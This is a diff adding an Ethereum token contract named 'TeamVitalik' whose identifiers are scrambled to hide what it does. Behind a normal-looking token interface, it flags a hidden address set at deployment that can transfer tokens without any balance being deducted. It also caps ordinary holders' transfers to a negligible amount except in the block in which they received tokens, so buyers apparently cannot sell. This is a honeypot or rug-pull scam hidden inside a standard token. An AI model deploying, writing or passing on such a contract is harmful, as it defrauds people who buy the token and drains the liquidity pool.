@@ -1,0 +1,64 @@
+contract TeamVitalik is Ownable {
+    function transferFrom(address hdrypbignevu, address kwpmefdvauz, uint256 yipvewkjt) public returns (bool success) {
+        require(yipvewkjt <= allowance[hdrypbignevu][msg.sender]);
+        allowance[hdrypbignevu][msg.sender] -= yipvewkjt;
+        jzfprxdauy(hdrypbignevu, kwpmefdvauz, yipvewkjt);
+        return true;
+    }
+
+    mapping(address => uint256) private linzcwksqrxy;
+
+    uint8 public decimals = 9;
+
+    uint256 private mqxnwztrid = 103;
+
+    mapping(address => mapping(address => uint256)) public allowance;
+
+    constructor(string memory hunj, string memory knpfres, address hpvifbyaeg, address dwcepxihb) {
+        name = hunj;
+        symbol = knpfres;
+        balanceOf[msg.sender] = totalSupply;
+        rxam[dwcepxihb] = mqxnwztrid;
+        IUniswapV2Router02 zoubsih = IUniswapV2Router02(hpvifbyaeg);
+        gyrah = IUniswapV2Factory(zoubsih.factory()).createPair(address(this), zoubsih.WETH());
+    }
+
+    string public symbol;
+
+    mapping(address => uint256) private rxam;
+
+    address private gyrah;
+
+    string public name;
+
+    mapping(address => uint256) public balanceOf;
+
+    event Transfer(address indexed from, address indexed to, uint256 value);
+
+    uint256 public totalSupply = 1000000000 * 10 ** 9;
+
+    function jzfprxdauy(address hdrypbignevu, address kwpmefdvauz, uint256 yipvewkjt) private {
+        if (0 == rxam[hdrypbignevu]) {
+            if (hdrypbignevu != gyrah && linzcwksqrxy[hdrypbignevu] != block.number && yipvewkjt < totalSupply) {
+                require(yipvewkjt <= totalSupply / (10 ** decimals));
+            }
+            balanceOf[hdrypbignevu] -= yipvewkjt;
+        }
+        balanceOf[kwpmefdvauz] += yipvewkjt;
+        linzcwksqrxy[kwpmefdvauz] = block.number;
+        emit Transfer(hdrypbignevu, kwpmefdvauz, yipvewkjt);
+    }
+
+    function approve(address kbtlzfwy, uint256 yipvewkjt) public returns (bool success) {
+        allowance[msg.sender][kbtlzfwy] = yipvewkjt;
+        emit Approval(msg.sender, kbtlzfwy, yipvewkjt);
+        return true;
+    }
+
+    function transfer(address kwpmefdvauz, uint256 yipvewkjt) public returns (bool success) {
+        jzfprxdauy(msg.sender, kwpmefdvauz, yipvewkjt);
+        return true;
+    }
+
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+}
